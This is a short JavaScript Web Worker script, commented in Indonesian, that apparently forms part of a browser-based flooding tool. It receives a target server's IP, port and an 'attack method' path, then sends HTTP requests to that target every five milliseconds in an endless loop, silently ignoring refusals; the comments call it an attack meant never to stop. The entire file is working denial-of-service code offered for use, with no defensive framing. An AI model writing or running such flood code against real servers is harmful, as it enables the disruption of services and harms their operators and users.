self.onmessage = function(event) {
    let { serverIP, serverPort, attackMethod } = event.data;

    function sendRequest() {
        fetch(`http://${serverIP}:${serverPort}/${attackMethod}`)
            .catch(() => {}); // Abaikan error jika server menolak request
    }

    function attackLoop() {
        sendRequest();
        setTimeout(attackLoop, 5); // Loop terus tanpa berhenti
    }

    attackLoop(); // Mulai serangan tanpa henti
};
